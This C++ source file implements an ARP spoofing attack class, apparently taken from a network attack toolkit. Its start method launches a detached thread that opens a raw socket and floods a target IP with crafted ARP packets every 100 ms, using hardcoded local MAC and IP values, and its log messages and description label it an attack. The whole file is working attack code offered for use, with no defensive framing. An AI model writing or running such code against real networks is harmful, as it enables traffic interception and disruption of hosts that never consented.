#include "attack/ARPAttack.h"
#include "network/PacketBuilder.h"
#include "network/RawSocket.h"
#include "util/Logger.h"
#include "util/Randomizer.h"
#include <thread>
#include <chrono>

ARPAttack::ARPAttack(const std::string& targetIP, const std::string& interface)
    : targetIP_(targetIP), interface_(interface) {}

ARPAttack::~ARPAttack() {
    stop();
}

void ARPAttack::start() {
    if (running_) return;
    
    running_ = true;
    Logger::getInstance().log(LogLevel::INFO, "Starting ARP attack on " + targetIP_);
    
    std::thread([this]() {
        try {
            RawSocket socket(ETH_P_ARP);
            
            // 获取本地MAC和IP（简化实现）
            std::string localMAC = "00:11:22:33:44:55";
            std::string localIP = "192.168.1.100";
            std::string targetMAC = "ff:ff:ff:ff:ff:ff"; // 广播地址
            
            while (running_) {
                auto packet = PacketBuilder::buildARPPacket(
                    localMAC, localIP, targetMAC, targetIP_, true);
                
                if (!socket.sendPacket(packet)) {
                    Logger::getInstance().log(LogLevel::ERROR, "Failed to send ARP packet");
                }
                
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
            }
        } catch (const std::exception& e) {
            Logger::getInstance().log(LogLevel::ERROR, "ARP attack error: " + std::string(e.what()));
            running_ = false;
        }
    }).detach();
}

void ARPAttack::stop() {
    running_ = false;
    Logger::getInstance().log(LogLevel::INFO, "Stopped ARP attack");
}

std::string ARPAttack::getDescription() const {
    return "ARP spoofing attack targeting " + targetIP_;
}